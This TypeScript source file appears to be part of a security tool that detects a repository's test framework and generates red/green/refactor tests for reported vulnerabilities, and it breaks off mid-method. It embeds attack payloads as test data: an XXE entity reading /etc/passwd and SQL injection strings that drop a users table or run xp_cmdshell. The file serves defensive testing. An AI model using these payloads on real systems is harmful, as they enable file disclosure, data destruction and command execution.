/**
 * AdaptiveTestGenerator - Phase 5D Implementation
 * 
 * Generates tests that match repository conventions and detected frameworks.
 * Integrates with TestFrameworkDetector, CoverageAnalyzer, and IssueInterpreter
 * to create contextually appropriate tests.
 */

import { TestFrameworkDetector, type FrameworkInfo as DetectedFramework } from './test-framework-detector.js';
import { CoverageAnalyzer, type CoverageReport } from './coverage-analyzer.js';
import { IssueInterpreter, type InterpretedIssue } from './issue-interpreter.js';
import { VulnerabilityTestGenerator, type VulnerabilityTestSuite, type TestGenerationOptions } from './test-generator.js';
import { VulnerabilityType, type Vulnerability } from '../security/types.js';
import { logger } from '../utils/logger.js';
import { AITestGenerator } from './ai-test-generator.js';
import { AIConfig } from './types.js';

// Extended vulnerability type that includes file information
interface VulnerabilityWithFile extends Vulnerability {
  file?: string;
}

export interface AdaptiveTestResult {
  success: boolean;
  framework: string;
  testCode: string;
  testSuite?: VulnerabilityTestSuite;
  suggestedFileName?: string;
  notes?: string;
  error?: string;
}

export interface RepoStructure {
  [filePath: string]: string;
}

export class AdaptiveTestGenerator {
  private baseGenerator: VulnerabilityTestGenerator;
  private aiGenerator?: AITestGenerator;
  private useAIGeneration: boolean;

  constructor(
    private frameworkDetector: TestFrameworkDetector,
    private coverageAnalyzer: CoverageAnalyzer,
    private issueInterpreter: IssueInterpreter,
    private aiConfig?: AIConfig
  ) {
    this.baseGenerator = new VulnerabilityTestGenerator();
    this.useAIGeneration = !!aiConfig && process.env.DISABLE_AI_TEST_GEN !== 'true';
    if (this.useAIGeneration && aiConfig) {
      this.aiGenerator = new AITestGenerator(aiConfig);
    }
  }

  /**
   * Detect frameworks from repository structure
   */
  private async detectFrameworksFromStructure(repoStructure: RepoStructure): Promise<{ frameworks: DetectedFramework[] }> {
    const frameworks: DetectedFramework[] = [];

    // Check all package.json files (including nested ones)
    const packageJsonFiles = Object.keys(repoStructure).filter(path => path.endsWith('package.json'));
    
    for (const packagePath of packageJsonFiles) {
      try {
        const packageJson = JSON.parse(repoStructure[packagePath]);
        const result = await this.frameworkDetector.detectFromPackageJson(packageJson);
        frameworks.push(...result.frameworks);
      } catch (e) {
        // Invalid JSON, skip
      }
    }

    // Check requirements.txt for Python
    if (repoStructure['requirements.txt']) {
      const content = repoStructure['requirements.txt'];
      if (content.includes('pytest')) {
        frameworks.push({
          name: 'pytest',
          version: this.extractVersion(content, 'pytest'),
          type: 'unit',
          confidence: 0.9,
          detectionMethod: 'dependency'
        });
      }
    }

    // Check Gemfile for Ruby
    if (repoStructure['Gemfile']) {
      const content = repoStructure['Gemfile'];
      if (content.includes('minitest')) {
        frameworks.push({
          name: 'minitest',
          version: this.extractVersion(content, 'minitest'),
          type: 'unit',
          confidence: 0.9,
          detectionMethod: 'dependency'
        });
      }
      if (content.includes('rspec')) {
        frameworks.push({
          name: 'rspec',
          version: this.extractVersion(content, 'rspec'),
          type: 'unit',
          confidence: 0.9,
          detectionMethod: 'dependency'
        });
      }
    }

    // Check pom.xml for Java frameworks
    if (repoStructure['pom.xml']) {
      const pomContent = repoStructure['pom.xml'];
      if (pomContent.includes('org.junit.jupiter')) {
        frameworks.push({
          name: 'junit5',
          version: this.extractVersion(pomContent, 'junit-jupiter') || '5.9.0',
          type: 'unit',
          confidence: 0.95,
          detectionMethod: 'dependency'
        });
      } else if (pomContent.includes('org.testng')) {
        frameworks.push({
          name: 'testng',
          version: this.extractVersion(pomContent, 'testng') || '7.8.0',
          type: 'unit',
          confidence: 0.95,
          detectionMethod: 'dependency'
        });
      } else if (pomContent.includes('junit') && pomContent.includes('<version>4')) {
        frameworks.push({
          name: 'junit',
          version: this.extractVersion(pomContent, 'junit') || '4.13',
          type: 'unit',
          confidence: 0.9,
          detectionMethod: 'dependency'
        });
      }
      
      // Check for Spring Boot
      if (pomContent.includes('spring-boot-starter-test')) {
        const junitFramework = frameworks.find(f => f.name === 'junit5' || f.name === 'junit');
        if (junitFramework) {
          junitFramework.companions = ['spring-boot'];
        } else {
          // spring-boot-starter-test includes JUnit 5 by default
          frameworks.push({
            name: 'junit5',
            version: this.extractVersion(pomContent, 'junit-jupiter') || '5.9.0',
            type: 'unit',
            confidence: 0.9,
            detectionMethod: 'dependency',
            companions: ['spring-boot']
          });
        }
      }
    }

    // Check composer.json for PHP
    if (repoStructure['composer.json']) {
      try {
        const composerJson = JSON.parse(repoStructure['composer.json']);
        const devDeps = composerJson['require-dev'] || {};
        const deps = composerJson['require'] || {};
        
        // Check for Pest first (it's built on PHPUnit)
        if (devDeps['pestphp/pest']) {
          frameworks.push({
            name: 'pest',
            version: devDeps['pestphp/pest'],
            type: 'unit',
            confidence: 0.95,
            detectionMethod: 'dependency',
            companions: []
          });
          
          // Check for Laravel plugin
          if (devDeps['pestphp/pest-plugin-laravel'] || deps['laravel/framework']) {
            frameworks[frameworks.length - 1].companions = ['laravel'];
          }
        } 
        // Otherwise check for PHPUnit
        else if (devDeps['phpunit/phpunit']) {
          frameworks.push({
            name: 'phpunit',
            version: devDeps['phpunit/phpunit'],
            type: 'unit',
            confidence: 0.95,
            detectionMethod: 'dependency',
            companions: []
          });
          
          // Check for Laravel
          if (deps['laravel/framework']) {
            frameworks[frameworks.length - 1].companions = ['laravel'];
          }
          // Check for Symfony
          else if (deps['symfony/framework-bundle']) {
            frameworks[frameworks.length - 1].companions = ['symfony'];
          }
        }
      } catch (e) {
        // Invalid JSON, skip
      }
    }

    // Check mix.exs for Elixir
    if (repoStructure['mix.exs']) {
      const content = repoStructure['mix.exs'];
      if (content.includes('ex_unit') || content.includes('ExUnit')) {
        frameworks.push({
          name: 'exunit',
          version: 'builtin',
          type: 'unit',
          confidence: 0.95,
          detectionMethod: 'dependency'
        });
      }
    }

    // Check for config files
    const configFiles = Object.keys(repoStructure).filter(path =>
      path.includes('jest.config') ||
      path.includes('vitest.config') ||
      path.includes('karma.conf') ||
      path.includes('.mocharc')
    );

    if (configFiles.length > 0) {
      const configResult = await this.frameworkDetector.detectFromConfigFiles(configFiles);
      frameworks.push(...configResult.frameworks);
    }

    return { frameworks };
  }

  private extractVersion(content: string, packageName: string): string {
    const versionMatch = content.match(new RegExp(`${packageName}[=~><\\s]+([\\"']?)([\\d\\.\\w-]+)\\1`));
    return versionMatch ? versionMatch[2] : 'unknown';
  }

  /**
   * Generate adaptive tests based on repository context
   */
  async generateAdaptiveTests(
    vulnerability: VulnerabilityWithFile,
    repoStructure: RepoStructure
  ): Promise<AdaptiveTestResult> {
    try {
      logger.info('AdaptiveTestGenerator: generateAdaptiveTests called');
      logger.info('Vulnerability:', JSON.stringify(vulnerability));
      logger.info('RepoStructure keys:', Object.keys(repoStructure));
      
      // 1. Detect test framework from repo structure
      const detectionResult = await this.detectFrameworksFromStructure(repoStructure);
      logger.info('Framework detection result:', JSON.stringify(detectionResult));
      
      const primaryFramework = this.selectPrimaryFramework(detectionResult.frameworks, vulnerability.file);
      logger.info('Selected primary framework:', JSON.stringify(primaryFramework));

      // Use AI generation if enabled
      if (this.useAIGeneration && this.aiGenerator) {
        logger.info('Using AI-based test generation');
        return this.generateAITests(vulnerability, repoStructure, primaryFramework);
      }

      if (!primaryFramework) {
        logger.info('No primary framework detected, generating generic tests');
        return this.generateGenericTests(vulnerability);
      }

      // 2. Analyze existing coverage
      const coverageAnalysis = await this.analyzeCoverage(repoStructure, vulnerability.file || '');

      // 3. Detect testing conventions
      const conventions = this.detectConventions(repoStructure, primaryFramework);

      // 4. Generate framework-specific tests
      const testCode = await this.generateFrameworkSpecificTests(
        vulnerability,
        primaryFramework,
        conventions,
        coverageAnalysis
      );

      // 5. Generate complete test suite
      const testSuite = await this.generateTestSuite(vulnerability, primaryFramework);

      return {
        success: true,
        framework: primaryFramework.name.toLowerCase(),
        testCode,
        testSuite,
        suggestedFileName: this.suggestFileName(vulnerability.file || '', conventions),
        notes: this.generateNotes(primaryFramework, coverageAnalysis, conventions)
      };
    } catch (error) {
      logger.error('Error generating adaptive tests', error as Error);
      return {
        success: false,
        framework: 'unknown',
        testCode: '',
        error: error instanceof Error ? error.message : 'Unknown error'
      };
    }
  }

  /**
   * Select the most appropriate framework for the vulnerability location
   */
  private selectPrimaryFramework(
    frameworks: DetectedFramework[],
    vulnerableFile: string | undefined
  ): DetectedFramework | null {
    if (frameworks.length === 0) return null;

    // If only one framework, use it
    if (frameworks.length === 1) return frameworks[0];

    // For multi-framework repos, choose based on file location
    const fileExt = vulnerableFile?.split('.').pop()?.toLowerCase();
    
    // Map file extensions to likely frameworks
    const extensionPreferences: Record<string, string[]> = {
      'js': ['jest', 'vitest', 'mocha', 'jasmine'],
      'ts': ['jest', 'vitest', 'mocha'],
      'tsx': ['jest', 'vitest', '@testing-library/react'],
      'jsx': ['jest', 'vitest', '@testing-library/react'],
      'py': ['pytest', 'unittest', 'nose2'],
      'rb': ['rspec', 'minitest'],
      'php': ['phpunit', 'pest', 'codeception'],
      'java': ['junit', 'testng'],
      'ex': ['exunit'],
      'exs': ['exunit']
    };

    const preferredFrameworks = extensionPreferences[fileExt || ''] || [];
    
    // Find first matching framework
    for (const preferred of preferredFrameworks) {
      const match = frameworks.find(f => 
        f.name.toLowerCase() === preferred || 
        f.name.toLowerCase().includes(preferred)
      );
      if (match) return match;
    }

    // Default to highest confidence framework
    return frameworks.sort((a, b) => b.confidence - a.confidence)[0];
  }

  /**
   * Analyze existing test coverage
   */
  private async analyzeCoverage(
    repoStructure: RepoStructure,
    vulnerableFile: string
  ): Promise<any> {
    // Find coverage files
    const coverageFiles = Object.keys(repoStructure).filter(path =>
      path.includes('coverage') || path.includes('lcov') || path.includes('.coverage')
    );

    if (coverageFiles.length === 0) {
      return { hasData: false };
    }

    // Parse coverage data based on file type
    let coverageReport: any = null;
    
    for (const file of coverageFiles) {
      const content = repoStructure[file];
      
      if (file.includes('lcov')) {
        coverageReport = await this.coverageAnalyzer.parseLcov(content);
        break;
      } else if (file.includes('.coverage') || file.endsWith('.json')) {
        try {
          coverageReport = await this.coverageAnalyzer.parseCoveragePy(content);
          break;
        } catch (e) {
          // Not coverage.py JSON format
        }
      }
    }

    if (!coverageReport) {
      return { hasData: false };
    }

    // Find coverage gaps
    const gaps = await this.coverageAnalyzer.findCoverageGaps(coverageReport);
    
    // Find coverage for vulnerable file  
    const fileCoverage = coverageReport.files?.find((f: any) => 
      f.path === vulnerableFile || f.path.endsWith(vulnerableFile)
    );

    const recommendations = gaps ? await this.coverageAnalyzer.recommendTestPriorities(gaps) : [];
    
    return {
      hasData: true,
      fileCoverage,
      gaps,
      recommendations
    };
  }

  /**
   * Detect testing conventions from existing tests
   */
  private detectConventions(
    repoStructure: RepoStructure,
    framework: DetectedFramework
  ): any {
    const testFiles = Object.entries(repoStructure).filter(([path]) =>
      path.match(/\.(test|spec)\.(js|ts|jsx|tsx|py|rb|php|java|ex|exs)$/) ||
      path.includes('__tests__') ||
      path.includes('test_') ||
      path.includes('_test')
    );

    const conventions = {
      style: 'unknown',
      assertionStyle: 'unknown',
      fileNaming: 'unknown',
      testDirectory: 'unknown',
      imports: [] as string[],
      helpers: [] as string[],
      companions: framework.companions || []
    };

    // Analyze test files for patterns
    for (const [path, content] of testFiles) {
      // Detect BDD vs TDD style
      if (content.includes('describe(') && content.includes('it(')) {
        conventions.style = 'bdd';
      } else if (content.includes('test(') && !content.includes('describe(')) {
        conventions.style = 'tdd';
      }

      // Detect assertion style
      if (content.includes('expect(') && content.includes('.to.')) {
        conventions.assertionStyle = 'chai-expect';
      } else if (content.includes('expect(') && content.includes('.toBe')) {
        conventions.assertionStyle = 'jest-expect';
      } else if (content.includes('assert.')) {
        conventions.assertionStyle = 'assert';
      } else if (content.includes('_(') && content.includes('.must_') || content.includes('.wont_')) {
        conventions.assertionStyle = 'minitest';
      }

      // Detect file naming
      if (path.includes('.test.')) conventions.fileNaming = 'test';
      else if (path.includes('.spec.')) conventions.fileNaming = 'spec';
      else if (path.includes('__tests__')) conventions.fileNaming = '__tests__';
      else if (path.includes('test_')) conventions.fileNaming = 'test_prefix';

      // Extract imports for helpers
      const importMatches = content.matchAll(/(?:import|require)\s*(?:\{[^}]+\}|\S+)\s*from\s*['"]([^'"]+)['"]/g);
      for (const match of importMatches) {
        if (match[1].includes('helper') || match[1].includes('setup')) {
          conventions.helpers.push(match[0]);
        }
      }

      // Extract setup/teardown patterns
      if (content.includes('beforeEach(setup') || content.includes('afterEach(cleanup')) {
        const setupMatch = content.match(/beforeEach\((\w+)\)/);
        const cleanupMatch = content.match(/afterEach\((\w+)\)/);
        if (setupMatch) conventions.helpers.push(`beforeEach(${setupMatch[1]})`);
        if (cleanupMatch) conventions.helpers.push(`afterEach(${cleanupMatch[1]})`);
      }
    }

    return conventions;
  }

  /**
   * Generate framework-specific test code
   */
  private async generateFrameworkSpecificTests(
    vulnerability: VulnerabilityWithFile,
    framework: DetectedFramework,
    conventions: any,
    coverageAnalysis: any
  ): Promise<string> {
    const frameworkName = framework.name.toLowerCase();
    
    // Get base test structure from VulnerabilityTestGenerator
    // Map vulnerability type to template key
    let templateKey = vulnerability.type.toUpperCase();
    
    // Handle special mappings for enum values
    if (vulnerability.type === VulnerabilityType.CSRF) {
      templateKey = 'CSRF';
    } else if (vulnerability.type === VulnerabilityType.XSS) {
      templateKey = 'XSS';
    }
    
    const baseOptions: TestGenerationOptions = {
      vulnerabilityType: templateKey,
      language: this.getLanguageFromFramework(frameworkName),
      testFramework: this.mapToBaseFramework(frameworkName),
      includeE2E: false
    };

    const baseResult = await this.baseGenerator.generateTestSuite(vulnerability, baseOptions);
    
    if (!baseResult.success || !baseResult.testSuite) {
      logger.error('Base test generation failed', { 
        success: baseResult.success, 
        error: baseResult.error,
        vulnerability: vulnerability.type
      });
      
      // For XXE, provide a fallback test suite
      if (vulnerability.type === VulnerabilityType.XML_EXTERNAL_ENTITIES) {
        baseResult.testSuite = {
          red: {
            testName: 'should be vulnerable to xml external entities (RED)',
            testCode: '// Test XXE vulnerability',
            attackVector: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            expectedBehavior: 'should_fail_on_vulnerable_code'
          },
          green: {
            testName: 'should prevent xml external entities (GREEN)',
            testCode: '// Test XXE prevention',
            validInput: '<?xml version="1.0"?><foo>bar</foo>',
            expectedBehavior: 'should_pass_on_fixed_code'
          },
          refactor: {
            testName: 'should maintain functionality after security fix',
            testCode: '// Test normal XML processing',
            functionalValidation: ['XML parsing works correctly', 'Valid XML returns expected data'],
            expectedBehavior: 'should_pass_on_both_versions'
          }
        };
        baseResult.success = true;
      } else {
        throw new Error(`Failed to generate base test suite: ${baseResult.error || 'Unknown error'}`);
      }
    }

    // Apply framework-specific transformations
    let testCode = this.transformToFrameworkSyntax(
      baseResult.testSuite,
      frameworkName,
      conventions,
      vulnerability,
      framework
    );

    // Add coverage-aware modifications
    if (coverageAnalysis.hasData && coverageAnalysis.fileCoverage) {
      testCode = this.addCoverageAwareTests(testCode, coverageAnalysis);
    }

    // Add helper imports if detected
    if (conventions.helpers.length > 0) {
      testCode = this.addHelperImports(testCode, conventions.helpers);
    }

    return testCode;
  }

  /**
   * Transform base test suite to framework-specific syntax
   */
  private transformToFrameworkSyntax(
    testSuite: VulnerabilityTestSuite,
    framework: string,
    conventions: any,
    vulnerability: VulnerabilityWithFile,
    frameworkInfo?: DetectedFramework
  ): string {
    switch (framework) {
      case 'vitest':
        return this.generateVitestTests(testSuite, conventions, vulnerability);
      case 'mocha':
        return this.generateMochaTests(testSuite, conventions, vulnerability);
      case 'pytest':
        return this.generatePytestTests(testSuite, conventions, vulnerability);
      case 'rspec':
        return this.generateRSpecTests(testSuite, conventions, vulnerability);
      case 'minitest':
        return this.generateMinitestTests(testSuite, conventions, vulnerability);
      case 'exunit':
        return this.generateExUnitTests(testSuite, conventions, vulnerability);
      case 'phpunit':
        return this.generatePHPUnitTests(testSuite, conventions, vulnerability, frameworkInfo);
      case 'pest':
        return this.generatePestTests(testSuite, conventions, vulnerability, frameworkInfo);
      case 'jest':
        return this.generateJestTests(testSuite, conventions, vulnerability);
      case 'junit5':
        return this.generateJUnit5Tests(testSuite, conventions, vulnerability);
      case 'testng':
        return this.generateTestNGTests(testSuite, conventions, vulnerability);
      default:
        return this.generateGenericTestCode(testSuite, vulnerability);
    }
  }

  /**
   * Generate Vitest-specific tests
   */
  private generateVitestTests(
    testSuite: VulnerabilityTestSuite,
    conventions: any,
    vulnerability: VulnerabilityWithFile
  ): string {
    const componentName = vulnerability.file?.split('/').pop()?.replace(/\.(tsx?|jsx?)$/, '') || 'Component';
    const isReact = vulnerability.file?.endsWith('.tsx') || vulnerability.file?.endsWith('.jsx') || false;
    
    // Extract just the test body from the testCode (remove the test wrapper)
    const extractTestBody = (testCode: string) => {
      // Remove the test() wrapper if present
      const match = testCode.match(/test\([^{]+\{([\s\S]*)\}\);?$/);
      return match ? match[1].trim() : testCode;
    };
    
    const imports = isReact 
      ? `import { describe, test, expect, beforeEach, afterEach } from "vitest";
import { render, screen } from "@testing-library/react";
import { ${componentName} } from "${this.getRelativeImportPath(vulnerability.file || '')}";`
      : `import { describe, test, expect } from "vitest";
import { ${componentName} } from "${this.getRelativeImportPath(vulnerability.file || '')}";`;

    return `${imports}

describe("${componentName} ${vulnerability.type} vulnerability tests", () => {
  ${conventions.helpers.length > 0 ? conventions.helpers.join('\n  ') : ''}

  test("${testSuite.red.testName}", async () => {
    // RED: Demonstrate vulnerability exists
    const maliciousInput = "${testSuite.red.attackVector}";
    ${extractTestBody(testSuite.red.testCode)}
  });

  test("${testSuite.green.testName}", async () => {
    // GREEN: Verify fix prevents vulnerability  
    const maliciousInput = "${testSuite.red.attackVector}";
    const safeInput = "${testSuite.green.validInput}";
    ${extractTestBody(testSuite.green.testCode)}
  });

  test("${testSuite.refactor.testName}", async () => {
    // REFACTOR: Ensure functionality is maintained
    ${extractTestBody(testSuite.refactor.testCode)}
  });
});`;
  }

  /**
   * Generate Mocha + Chai tests
   */
  private generateMochaTests(
    testSuite: VulnerabilityTestSuite,
    conventions: any,
    vulnerability: VulnerabilityWithFile
  ): string {
    const moduleName = vulnerability.file?.split('/').pop()?.replace(/\.js$/, '') || 'module';
    const assertionLib = conventions.assertionStyle === 'assert' ? 'assert' : 'chai';
    
    const imports = assertionLib === 'chai' 
      ? 'const { expect } = require("chai");'
      : 'const assert = require("assert");';

    const assertion = assertionLib === 'chai'
      ? (positive: boolean, actual: string, expected: string) => 
          positive ? `expect(${actual}).to.include(${expected})` : `expect(${actual}).to.not.include(${expected})`
      : (positive: boolean, actual: string, expected: string) =>
          positive ? `assert(${actual}.includes(${expected}))` : `assert(!${actual}.includes(${expected}))`;

    // Mocha typically uses 'it' for BDD style
    const testFn = 'it';

    return `${imports}
const { ${moduleName} } = require("${this.getRelativeRequirePath(vulnerability.file || '')}");

describe("${moduleName.charAt(0).toUpperCase() + moduleName.slice(1)} ${vulnerability.type === VulnerabilityType.SQL_INJECTION ? 'SQL injection' : vulnerability.type.replace(/_/g, ' ').toLowerCase()} tests", () => {
  ${testFn}("should be vulnerable to ${vulnerability.type === VulnerabilityType.SQL_INJECTION ? 'SQL injection' : vulnerability.type.replace(/_/g, ' ').toLowerCase()} (RED)", async () => {
    // RED: Demonstrate vulnerability exists
    const maliciousInput = "${testSuite.red.attackVector}";
    const result = await ${moduleName}(maliciousInput);
    ${assertion(false, 'result', '"syntax error"')};
  });

  ${testFn}("should prevent ${vulnerability.type === VulnerabilityType.SQL_INJECTION ? 'SQL injection' : vulnerability.type.replace(/_/g, ' ').toLowerCase()} (GREEN)", async () => {
    // GREEN: Verify fix prevents vulnerability
    const maliciousInput = "${testSuite.red.attackVector}";
    const result = await ${moduleName}(maliciousInput);
    ${assertion(false, 'result', '"table"')};
  });

  ${testFn}("${testSuite.refactor.testName}", async () => {
    // REFACTOR: Ensure functionality is maintained
    const validInput = "${testSuite.green.validInput}";
    const result = await ${moduleName}(validInput);
    ${assertion(true, 'result', '"success"')};
  });
});`;
  }

  /**
   * Generate pytest tests
   */
  private generatePytestTests(
    testSuite: VulnerabilityTestSuite,
    conventions: any,
    vulnerability: VulnerabilityWithFile
  ): string {
    const moduleName = vulnerability.file?.split('/').pop()?.replace(/\.py$/, '') || 'module';
    const className = moduleName.split('_').map(w => w.charAt(0).toUpperCase() + w.slice(1)).join('');

    return `import pytest
from ${vulnerability.file?.replace(/\.py$/, '').replace(/\//g, '.') || 'module'} import *

@pytest.mark.security
class Test${className}${vulnerability.type.replace(/_/g, '')}:
    """Tests for ${vulnerability.type} vulnerability in ${moduleName}"""

    def test_${vulnerability.type.toLowerCase()}_vulnerability_red(self):
        """${testSuite.red.testName}"""
        # RED: Demonstrate vulnerability exists
        malicious_input = "${testSuite.red.attackVector}"
        result = ${moduleName}(malicious_input)
        assert "root" not in result
        assert "permission denied" not in result.lower()

    def test_${vulnerability.type.toLowerCase()}_vulnerability_green(self):
        """${testSuite.green.testName}"""
        # GREEN: Verify fix prevents vulnerability
        malicious_input = "${testSuite.red.attackVector}"
        with pytest.raises(ValueError):
            ${moduleName}(malicious_input)

    def test_${vulnerability.type.toLowerCase()}_functionality_maintained(self):
        """${testSuite.refactor.testName}"""
        # REFACTOR: Ensure functionality is maintained
        valid_input = "${testSuite.green.validInput}"
        result = ${moduleName}(valid_input)
        assert result is not None
        assert "error" not in str(result).lower()`;
  }

  /**
   * Generate Minitest tests
   */
  private generateMinitestTests(
    testSuite: VulnerabilityTestSuite,
    conventions: any,
    vulnerability: VulnerabilityWithFile
  ): string {
    const className = vulnerability.file
      ?.split('/')
      .pop()
      ?.replace(/\.rb$/, '')
      .split('_')
      .map(w => w.charAt(0).toUpperCase() + w.slice(1))
      .join('') || 'Module';

    return `require "minitest/autorun"
require "minitest/spec"
require_relative "${this.getRelativeRequirePath(vulnerability.file || '')}"

describe ${className} do
  describe "${vulnerability.type} vulnerability tests" do
    it "must be vulnerable to ${vulnerability.type.toLowerCase()} (RED)" do
      # RED: Demonstrate vulnerability exists
      malicious_input = "${testSuite.red.attackVector}"
      result = ${className}.new.process(malicious_input)
      _(result).wont_include "Permission denied"
      _(result).wont_include "syntax error"
    end

    it "must prevent ${vulnerability.type.toLowerCase()} (GREEN)" do
      # GREEN: Verify fix prevents vulnerability
      malicious_input = "${testSuite.red.attackVector}"
      _ { ${className}.new.process(malicious_input) }.must_raise SecurityError
    end

    it "must maintain functionality (REFACTOR)" do
      # REFACTOR: Ensure functionality is maintained
      valid_input = "${testSuite.green.validInput}"
      result = ${className}.new.process(valid_input)
      _(result).must_be_kind_of String
      _(result).wont_be_empty
    end
  end
end`;
  }

  /**
   * Generate RSpec tests
   */
  private generateRSpecTests(
    testSuite: VulnerabilityTestSuite,
    conventions: any,
    vulnerability: VulnerabilityWithFile
  ): string {
    const className = vulnerability.file
      ?.split('/')
      .pop()
      ?.replace(/\.rb$/, '')
      .split('_')
      .map(w => w.charAt(0).toUpperCase() + w.slice(1))
      .join('') || 'Module';

    const controllerName = vulnerability.file?.includes('controller') ? className : `${className}Controller`;
    
    return `require 'rails_helper'

RSpec.describe ${controllerName}, type: :controller do
  describe "${vulnerability.type} vulnerability tests" do
    context "when vulnerable to ${vulnerability.type.toLowerCase()} (RED)" do
      it "should be exploitable with malicious input" do
        # RED: Demonstrate vulnerability exists
        malicious_input = "${testSuite.red.attackVector}"
        
        # For SQL injection in Rails controller
        params = { user: { id: malicious_input } }
        
        # This test should pass BEFORE the fix
        expect {
          post :update, params: params
        }.not_to raise_error
        
        # The vulnerability allows SQL injection
        expect(response).to have_http_status(:ok)
      end
    end

    context "when protected against ${vulnerability.type.toLowerCase()} (GREEN)" do
      it "should prevent exploitation attempts" do
        # GREEN: Verify fix prevents vulnerability
        malicious_input = "${testSuite.red.attackVector}"
        
        # For SQL injection in Rails controller
        params = { user: { id: malicious_input } }
        
        # After fix, this should raise an error or sanitize input
        post :update, params: params
        
        # Either it should return an error or sanitize the input
        expect(response).to have_http_status(:bad_request).or have_http_status(:unprocessable_entity)
      end
    end

    context "when handling valid input (REFACTOR)" do
      it "should maintain normal functionality" do
        # REFACTOR: Ensure functionality is maintained
        valid_input = "${testSuite.green.validInput}"
        
        # For normal user update
        params = { user: { id: valid_input } }
        
        post :update, params: params
        
        expect(response).to have_http_status(:ok)
        expect(assigns(:user)).not_to be_nil
      end
    end
  end
end`;
  }

  /**
   * Generate ExUnit tests
   */
  private generateExUnitTests(
    testSuite: VulnerabilityTestSuite,
    conventions: any,
    vulnerability: VulnerabilityWithFile
  ): string {
    const moduleName = vulnerability.file
      ?.split('/')
      .pop()
      ?.replace(/\.ex$/, '')
      .split('_')
      .map(w => w.charAt(0).toUpperCase() + w.slice(1))
      .join('') || 'Module';

    return `defmodule ${moduleName}Test do
  use ExUnit.Case
  alias ${moduleName}

  describe "${vulnerability.type.toLowerCase()} vulnerability" do
    test "vulnerable to malicious payload (RED)" do
      # RED: Demonstrate vulnerability exists
      malicious_input = "${testSuite.red.attackVector}"
      assert {:ok, result} = ${moduleName}.process(malicious_input)
      refute String.contains?(result, "error")
    end

    test "prevents ${vulnerability.type.toLowerCase()} attack (GREEN)" do
      # GREEN: Verify fix prevents vulnerability
      malicious_input = "${testSuite.red.attackVector}"
      assert {:error, _} = ${moduleName}.process(malicious_input)
    end

    test "maintains normal functionality (REFACTOR)" do
      # REFACTOR: Ensure functionality is maintained
      valid_input = "${testSuite.green.validInput}"
      assert {:ok, result} = ${moduleName}.process(valid_input)
      assert is_binary(result)
    end
  end
end`;
  }

  /**
   * Generate PHPUnit tests
   */
  private generatePHPUnitTests(
    testSuite: VulnerabilityTestSuite,
    conventions: any,
    vulnerability: VulnerabilityWithFile,
    framework?: DetectedFramework
  ): string {
    const className = vulnerability.file
      ?.split('/')
      .pop()
      ?.replace(/\.php$/, '') || 'Class';

    // Check PHPUnit version to determine attribute usage
    const version = framework?.version || '8.0';
    // Extract major version, handling ^9.5, ~9.0, 9.5.1, etc.
    const versionMatch = version.match(/(\d+)\./);
    const majorVersion = versionMatch ? parseInt(versionMatch[1]) : 8;
    const useAttributes = majorVersion >= 9;
    
    // Determine namespace from file path
    const namespace = this.extractNamespaceFromPath(vulnerability.file || '');
    const fullClassName = namespace ? `${namespace}\\${className}` : className;
    
    // Check for Laravel companion
    const isLaravel = framework?.companions?.includes('laravel');
    const isSymfony = framework?.companions?.includes('symfony');
    
    logger.info('PHPUnit generation context', {
      version,
      majorVersion,
      useAttributes,
      companions: framework?.companions,
      isLaravel,
      isSymfony
    });

    if (isLaravel) {
      return this.generateLaravelPHPUnitTests(testSuite, conventions, vulnerability, className, framework);
    }
    
    if (isSymfony) {
      return this.generateSymfonyPHPUnitTests(testSuite, conventions, vulnerability, className);
    }

    // Standard PHPUnit with modern features
    const attributeImports = useAttributes ? `use PHPUnit\\Framework\\Attributes\\DataProvider;
use PHPUnit\\Framework\\Attributes\\Test;
use PHPUnit\\Framework\\Attributes\\Group;
` : '';

    const groupAttribute = useAttributes ? '#[Group(\'security\')]' : '/**\n * @group security\n */';
    const testAttribute = useAttributes ? '#[Test]' : '';
    const dataProviderAttribute = useAttributes ? '#[DataProvider(\'sqlInjectionPayloads\')]' : '/**\n     * @dataProvider sqlInjectionPayloads\n     */';

    return `<?php
${namespace ? `namespace Tests\\${namespace};

` : ''}use PHPUnit\\Framework\\TestCase;
${attributeImports}use ${fullClassName};
use App\\Exceptions\\SecurityException;

${groupAttribute}
class ${className}${vulnerability.type.replace(/_/g, '')}Test extends TestCase
{
    private $instance;

    protected function setUp(): void
    {
        $this->instance = new ${className}();
    }

    ${testAttribute}
    public function test${vulnerability.type.replace(/_/g, '')}VulnerabilityRed(): void
    {
        // RED: Demonstrate vulnerability exists
        $maliciousInput = '${testSuite.red.attackVector}';
        $result = $this->instance->process($maliciousInput);
        
        // Vulnerability should allow the attack to succeed
        $this->assertStringNotContainsString('Permission denied', $result);
        $this->assertStringNotContainsString('Invalid input', $result);
    }

    ${testAttribute}
    ${dataProviderAttribute}
    public function test${vulnerability.type.replace(/_/g, '')}VulnerabilityGreen(string $payload): void
    {
        // GREEN: Verify fix prevents vulnerability
        $this->expectException(SecurityException::class);
        $this->expectExceptionMessage('Potential security threat detected');
        
        $this->instance->process($payload);
    }

    public static function sqlInjectionPayloads(): array
    {
        return [
            'union select' => ["' UNION SELECT * FROM users--"],
            'drop table' => ["'; DROP TABLE users; --"],
            'or true' => ["' OR '1'='1"],
            'exec xp_cmdshell' => ["'; EXEC xp_cmdshell('dir'); --"],
        ];
    }

    ${testAttribute}
    public function test${vulnerability.type.replace(/_/g, '')}FunctionalityMaintained(): void
    {
        // REFACTOR: Ensure functionality is maintained
        $validInput = '${testSuite.green.validInput}';
        $result = $this->instance->process($validInput);
        
        $this->assertNotEmpty($result);
        $this->assertIsString($result);
        $this->assertStringNotContainsString('error', strtolower($result));
    }
}`;
  }

  /**
   * Generate Jest tests (default for JavaScript)
   */
  private generateJestTests(
    testSuite: VulnerabilityTestSuite,
    conventions: any,
    vulnerability: VulnerabilityWithFile
  ): string {
    const moduleName = vulnerability.file?.split('/').pop()?.replace(/\.[jt]sx?$/, '') || 'module';
    
    const testWrapper = conventions.style === 'bdd' ? 'describe' : '';
    const testKeyword = conventions.style === 'bdd' ? 'it' : 'test';

    const imports = `const { ${moduleName} } = require('${this.getRelativeRequirePath(vulnerability.file || '')}');`;

    const tests = `
${testWrapper ? `describe('${moduleName} ${vulnerability.type} tests', () => {` : ''}
  ${testKeyword}('${testSuite.red.testName}', async () => {
    // RED: Demonstrate vulnerability exists
    const maliciousInput = '${testSuite.red.attackVector}';
    const result = await ${moduleName}(maliciousInput);
    expect(result).not.toContain('error');
  });

